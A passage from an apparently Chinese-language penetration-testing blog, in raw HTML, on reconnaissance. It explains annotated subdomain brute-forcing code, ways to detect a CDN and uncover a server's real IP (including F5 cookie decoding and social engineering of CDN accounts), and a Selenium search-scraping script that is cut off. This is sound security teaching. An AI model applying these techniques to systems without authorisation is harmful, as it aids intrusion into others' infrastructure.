class=\"comment\"># 设置DNS解析器</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.resolvers[j].nameservers = [<span class=\"variable language_\">self</span>.dns_servers[j % <span class=\"variable language_\">self</span>.dns_count]]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.dns_count &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">                s = random.choice(<span class=\"variable language_\">self</span>.dns_servers)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> s != <span class=\"variable language_\">self</span>.dns_servers[j % <span class=\"variable language_\">self</span>.dns_count]:</span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.resolvers[j].nameservers.append(s)</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">        empty_counter = <span class=\"number\">0</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 处理子域</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                brace_count, sub = <span class=\"variable language_\">self</span>.queue.get_nowait()</span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.threads_status[j] = <span class=\"string\">'1'</span></span><br><span class=\"line\">                empty_counter = <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span> asyncio.queues.QueueEmpty <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                empty_counter += <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> empty_counter &gt; <span class=\"number\">10</span>:</span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.threads_status[j] = <span class=\"string\">'0'</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"string\">'1'</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.threads_status:</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">await</span> asyncio.sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># 对于带有通配符的子域进行处理</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> brace_count &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">                brace_count -= <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> sub.find(<span class=\"string\">'{next_sub}'</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.next_subs:</span><br><span class=\"line\">                        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, sub.replace(<span class=\"string\">'{next_sub}'</span>, _)))</span><br><span class=\"line\">                <span class=\"keyword\">if</span> sub.find(<span class=\"string\">'{alphnum}'</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"string\">'abcdefghijklmnopqrstuvwxyz0123456789'</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((brace_count, sub.replace(<span class=\"string\">'{alphnum}'</span>, _, <span class=\"number\">1</span>)))</span><br><span class=\"line\">                <span class=\"keyword\">elif</span> sub.find(<span class=\"string\">'{alpha}'</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"string\">'abcdefghijklmnopqrstuvwxyz'</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((brace_count, sub.replace(<span class=\"string\">'{alpha}'</span>, _, <span class=\"number\">1</span>)))</span><br><span class=\"line\">                <span class=\"keyword\">elif</span> sub.find(<span class=\"string\">'{num}'</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"string\">'0123456789'</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((brace_count, sub.replace(<span class=\"string\">'{num}'</span>, _, <span class=\"number\">1</span>)))</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> sub <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.found_subs:</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.scan_count_local += <span class=\"number\">1</span></span><br><span class=\"line\">                cur_domain = sub + <span class=\"string\">'.'</span> + <span class=\"variable language_\">self</span>.domain</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\"># 执行DNS查询</span></span><br><span class=\"line\">                answers = <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.do_query(j, cur_domain)</span><br><span class=\"line\">                </span><br><span class=\"line\">                <span class=\"comment\"># 处理DNS查询结果，排除无效IP</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> answers:</span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.found_subs.add(sub)</span><br><span class=\"line\">                    ips = <span class=\"string\">', '</span>.join(<span class=\"built_in\">sorted</span>([answer.address <span class=\"keyword\">for</span> answer <span class=\"keyword\">in</span> answers]))</span><br><span class=\"line\">                    invalid_ip_found = <span class=\"literal\">False</span></span><br><span class=\"line\">                    <span class=\"keyword\">for</span> answer <span class=\"keyword\">in</span> answers:</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> answer.address <span class=\"keyword\">in</span> [<span class=\"string\">'1.1.1.1'</span>, <span class=\"string\">'127.0.0.1'</span>, <span class=\"string\">'0.0.0.0'</span>, <span class=\"string\">'0.0.0.1'</span>]:</span><br><span class=\"line\">                            invalid_ip_found = <span class=\"literal\">True</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> invalid_ip_found:</span><br><span class=\"line\">                        <span class=\"keyword\">continue</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.options.i <span class=\"keyword\">and</span> is_intranet(answers[<span class=\"number\">0</span>].host):</span><br><span class=\"line\">                        <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                        <span class=\"comment\"># 查询CNAME记录</span></span><br><span class=\"line\">                        cname = <span class=\"built_in\">str</span>(answers.canonical_name)[:-<span class=\"number\">1</span>]</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> cname != cur_domain <span class=\"keyword\">and</span> cname.endswith(<span class=\"variable language_\">self</span>.domain):</span><br><span class=\"line\">                            cname_sub = cname[:<span class=\"built_in\">len</span>(cname) - <span class=\"built_in\">len</span>(<span class=\"variable language_\">self</span>.domain) - <span class=\"number\">1</span>]    <span class=\"comment\"># new sub</span></span><br><span class=\"line\">                            <span class=\"keyword\">if</span> cname_sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.found_subs <span class=\"keyword\">and</span> cname_sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.normal_names_set:</span><br><span class=\"line\">                                <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, cname_sub))</span><br><span class=\"line\">                    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    first_level_sub = sub.split(<span class=\"string\">'.'</span>)[-<span class=\"number\">1</span>]</span><br><span class=\"line\">                    max_found = <span class=\"number\">20</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.options.w:</span><br><span class=\"line\">                        first_level_sub = <span class=\"string\">''</span></span><br><span class=\"line\">                        max_found = <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (first_level_sub, ips) <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.ip_dict:</span><br><span class=\"line\">                        <span class=\"variable language_\">self</span>.ip_dict[(first_level_sub, ips)] = <span class=\"number\">1</span></span><br><span class=\"line\">                    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                        <span class=\"variable language_\">self</span>.ip_dict[(first_level_sub, ips)] += <span class=\"number\">1</span></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.ip_dict[(first_level_sub, ips)] &gt; max_found:</span><br><span class=\"line\">                            <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.found_count_local += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\"># 将查询结果写入文件</span></span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.outfile.write(cur_domain.ljust(<span class=\"number\">30</span>) + <span class=\"string\">'\\t'</span> + ips + <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.outfile.flush()</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\"># 检查HTTPS证书</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"variable language_\">self</span>.options.no_cert_check:</span><br><span class=\"line\">                        <span class=\"keyword\">async</span> <span class=\"keyword\">with</span> timeout(<span class=\"number\">10.0</span>):</span><br><span class=\"line\">                            <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.check_https_alt_names(cur_domain)</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                        <span class=\"variable language_\">self</span>.scan_count_local += <span class=\"number\">1</span></span><br><span class=\"line\">                        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.do_query(j, <span class=\"string\">'lijiejie-test-not-existed.'</span> + cur_domain)</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">except</span> dns.resolver.NXDOMAIN <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.queue.qsize() &lt; <span class=\"number\">20000</span>:</span><br><span class=\"line\">                            <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.next_subs:</span><br><span class=\"line\">                                <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, _ + <span class=\"string\">'.'</span> + sub))</span><br><span class=\"line\">                        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                            <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">1</span>, <span class=\"string\">'{next_sub}.'</span> + sub))</span><br><span class=\"line\">                    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                        <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">except</span> (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer) <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                <span class=\"keyword\">pass</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span> dns.resolver.NoNameservers <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.no_server_subs[sub] = <span class=\"variable language_\">self</span>.no_server_subs.get(sub, <span class=\"number\">0</span>) + <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.no_server_subs[sub] &lt;= <span class=\"number\">3</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, sub))    <span class=\"comment\"># Retry again</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span> (dns.exception.Timeout, dns.resolver.LifetimeTimeout) <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.timeout_subs[sub] = <span class=\"variable language_\">self</span>.timeout_subs.get(sub, <span class=\"number\">0</span>) + <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.timeout_subs[sub] &lt;= <span class=\"number\">3</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, sub))    <span class=\"comment\"># Retry again</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"built_in\">str</span>(<span class=\"built_in\">type</span>(e)).find(<span class=\"string\">'asyncio.exceptions.TimeoutError'</span>) &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">'errors.log'</span>, <span class=\"string\">'a'</span>) <span class=\"keyword\">as</span> errFile:</span><br><span class=\"line\">                        errFile.write(<span class=\"string\">'[%s] %s\\n'</span> % (<span class=\"built_in\">type</span>(e), <span class=\"built_in\">str</span>(e)))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">async_run</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.load_sub_names()</span><br><span class=\"line\">        tasks = [<span class=\"variable language_\">self</span>.scan(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"variable language_\">self</span>.options.threads)]</span><br><span class=\"line\">        tasks.insert(<span class=\"number\">0</span>, <span class=\"variable language_\">self</span>.update_counter())</span><br><span class=\"line\">        <span class=\"keyword\">await</span> asyncio.gather(*tasks)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">run</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        loop = asyncio.get_event_loop()</span><br><span class=\"line\">        asyncio.set_event_loop(loop)</span><br><span class=\"line\">        loop.run_until_complete(<span class=\"variable language_\">self</span>.async_run())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">run_process</span>(<span class=\"params\">*params</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 信号处理器</span></span><br><span class=\"line\">    signal.signal(signal.SIGINT, user_abort)</span><br><span class=\"line\">    <span class=\"comment\"># 调用SubNameBrute的run方法</span></span><br><span class=\"line\">    s = SubNameBrute(*params)</span><br><span class=\"line\">    s.run()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 根据option.process启动多个进程</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> process_num <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(options.process):</span><br><span class=\"line\">    p = multiprocessing.Process(</span><br><span class=\"line\">        <span class=\"comment\"># 调用run_process进行扫描</span></span><br><span class=\"line\">        target=run_process,</span><br><span class=\"line\">        args=(domain, options, process_num, dns_servers, next_subs,</span><br><span class=\"line\">              scan_count, found_count, queue_size_array, tmp_dir)</span><br><span class=\"line\">    )</span><br><span class=\"line\">    all_process.append(p)</span><br><span class=\"line\">    p.start()</span><br></pre></td></tr></tbody></table></figure>\n\n<p>总体的工作路径为：</p>\n<ul>\n<li><strong>加载子域名</strong>：从文件中读取子域名，识别通配符，放入任务队列</li>\n<li>扫描子域<ul>\n<li>多线程扫描子域</li>\n<li>对每个子域执行DNS查询，处理返回结果</li>\n<li>对子域名进行证书检查，CNAME解析等附加操作</li>\n</ul>\n</li>\n<li><strong>记录结果</strong></li>\n<li><strong>错误处理与重试</strong>：对于DNS查询失败的子域进行重试，最多三次</li>\n</ul>\n<p>这里有个证书检查和CNAME解析，还有一个称呼叫<strong>证书透明度</strong>主要原因是<strong>提高全面性</strong>。在<strong>SSL/TLS</strong>证书中的<code>subjectAltName</code>字段会暴露一些隐藏子域。<strong>CNAME</strong>是DNS中的一种记录类别，通常用于将一个域名指向另一个域名，也就是说CNAME可以为某个域名创建一个别名，因此可以去发现隐藏的域名，增加子域名查询的全面性。</p>\n<p><strong>对于通配符子域名的处理</strong>：讲这些子域存在一个集合中，避免重复爆破，根据查询CNAME和MX记录，挖掘更多的子域，并且进行递归查询。</p>\n","length":14974,"excerpt":"","more":"<h1 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h1><blockquote>\n<p>信息收集是渗透测试中的第一步，也是最为关键的一步。有大佬说过：渗透测试的本质就是信息收集。因此在这里认真钻研一下信息收集部分，包括收集什么？如何收集？自动化工具的原理？也尽量自己在每个模块开发出自己的工具，最终整合成自己的信息收集工具。</p>\n</blockquote>\n<h2 id=\"域名（Domain）\"><a href=\"#域名（Domain）\" class=\"headerlink\" title=\"域名（Domain）\"></a>域名（Domain）</h2><blockquote>\n<p>域名是由一串用点分隔的字符组成的互联网上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位。域名是IP地址的代称，目的是便于记忆。一般渗透都会从一个域名开始，因此由域名开始作为切入口。</p>\n</blockquote>\n<h3 id=\"判断CDN\"><a href=\"#判断CDN\" class=\"headerlink\" title=\"判断CDN\"></a>判断CDN</h3><p>内容分发网络（Content Delivery Network）的基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输更快更稳定。那这对我们渗透测试带来了什么影响呢？</p>\n<p>CDN会代理客户端的请求，将真实服务器的IP地址隐藏，让我们无法直接定位目标服务器，因此需要绕过CDN。</p>\n<p><strong>ping域名判断是否有CDN</strong></p>\n<p>当ping出来的域名为很长一串字符，或者有着很明显的cdn、ali、tencent等字段时大概率存在CDN。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133118.png\" alt=\"img\"></p>\n<p><strong>nslookup判断CDN</strong></p>\n<p>nslookup是一个命令行工具，用于查询Internet域名信息或诊断DNS服务器问题。</p>\n<p>通过nslookup检测一个域名是否对应多个IP可以判断是否使用CDN</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133620.png\" alt=\"img\"></p>\n<p><strong>多地ping判断CDN</strong></p>\n<p><a href=\"https://ping.chinaz.com/\">站长工具</a>还是比较直观的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133805.png\" alt=\"img\"></p>\n<h3 id=\"查看真实IP\"><a href=\"#查看真实IP\" class=\"headerlink\" title=\"查看真实IP\"></a>查看真实IP</h3><p>检测完CDN，就该绕过CDN检测了，获取真实IP</p>\n<p><strong>多地ping</strong></p>\n<p>不仅是检测CDN，同时也可以用来判断。</p>\n<p>如<code>www.youzan.com</code>，可以发现存在CDN，但是发现在除中国大陆外都是同一个IP，因此可以判断为真实IP</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121134240.png\" alt=\"img\"></p>\n<p><strong>子域名查询真实IP</strong></p>\n<p>CDN并非免费的，成本较大，因此很多公司可能只对主站或者访问量较大的站做了CDN加速。因此可以通过获取子域名来查询真实IP，查询方式可以利用上述多地ping方法。子域名收集在后面单独讲。</p>\n<p><strong>DNS历史记录</strong></p>\n<p>查看IP与域名绑定的历史记录，可能存在使用CDN前的解析记录，<a href=\"https://viewdns.info/\">Viewdns</a>或者之前的开发工具都可以查询</p>\n<p><strong>SSL证书</strong></p>\n<p>加入web服务器支持SSL并具有证书，在端口443直接访问时，SSL证书就会被暴露。此时攻击者会看见一个使用特定证书的IPv4主机列表，真实IP就在其中。</p>\n<p><strong>漏洞查找</strong></p>\n<ul>\n<li>敏感文件泄露，如phpinfo等，github信息泄露等。</li>\n<li>XSS、命令执行、SSRF等。</li>\n<li>社工等手段，拿到目标管理员在CDN账号，可以在CDN配置找到。</li>\n</ul>\n<p><strong>网站邮件</strong></p>\n<p>很多网站都自带<code>sendmail</code>，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实IP</p>\n<p><strong>F5 LTM解码</strong></p>\n<p>当服务器使用FT5 LTM做负载均衡的时候，对set-cookie关键字解码也可以获取真实IP</p>\n<figure class=\"highlight dns\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-Cookie: BIGipServerpool_<span class=\"number\">8.29_8030</span>=<span class=\"number\">487098378</span>.<span class=\"number\">24095.0000</span></span><br><span class=\"line\">先把第一小节的十进制数取出来：<span class=\"number\">487098378</span></span><br><span class=\"line\">再转化为十六进制数：<span class=\"number\">1d</span>08880a</span><br><span class=\"line\">从后至前取四位数：<span class=\"number\">0</span>a.<span class=\"number\">88</span>.<span class=\"number\">08</span>.<span class=\"number\">1d</span></span><br><span class=\"line\">转化为十进制即为IP：<span class=\"number\">10.136.8.29</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"子域名收集\"><a href=\"#子域名收集\" class=\"headerlink\" title=\"子域名收集\"></a>子域名收集</h3><p>在前面查看真实IP的地方提到了子域名收集，子域名收集不只是为了找真实IP服务，更是为了扩大资产收集范围。</p>\n<p><strong>搜索引擎收集</strong></p>\n<p>使用谷歌语法等可以收集大量信息，如<code>site:domain</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121143338.png\" alt=\"img\"></p>\n<p>尝试自己写了个基于Chrome搜索的脚本，爬取效果还是不错的，后面看看能不能增加功能</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> signal</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium <span class=\"keyword\">import</span> webdriver</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.common.by <span class=\"keyword\">import</span> By</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># write to file</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write_file</span>(<span class=\"params\">file_path, content</span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_path, <span class=\"string\">&#x27;a&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">            file.write(content + <span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(e)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># signal handler</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">signal_handler</span>(<span class=\"params\">sig, frame</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\nuser pause&quot;</span>)</span><br><span class=\"line\">    sys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># init selenium</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">setup_driver</span>():</span><br><span class=\"line\">    options = webdriver.ChromeOptions()</span><br><span class=\"line\">    options.add_argument(<span class=\"string\">&quot;--headless&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> webdriver.Chrome(options=options)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get domain in links</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">extract_domain</span>(<span class=\"params\">link</span>):</span><br><span class=\"line\">    <span class=\"keyword\">match</span> = re.search(<span class=\"string\">r&quot;https://(.*?)/&quot;</span>, link)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">match</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">match</span>.group(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># fetch links from result</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">fetch_links</span>(<span class=\"params\">driver, domain, page</span>):</span><br><span class=\"line\">    url = <span class=\"string\">f&quot;https://www.google.com/search?q=site:<span class=\"subst\">&#123;domain&#125;</span>&amp;start=<span class=\"subst\">&#123;page&#125;</span>0&quot;</span></span><br><span class=\"line\">    driver.get(url)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        elements = driver.find_elements(By.CSS_SELECTOR, <span class=\"string\">&quot;#rso .kb0PBd.A9Y9g.jGGQ5e span &gt; a&quot;</span>)</span><br><span class=\"line\">        links = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> element <span class=\"keyword\">in</span> elements:</span><br><span class=\"line\">            link = element.get_attribute(<span class=\"string\">&quot;href&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> link:</span><br><span class=\"line\">                links.append(link)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> links</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;failed to fetch links: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> []</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># main</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    <span class=\"comment\"># signal init</span></span><br><span 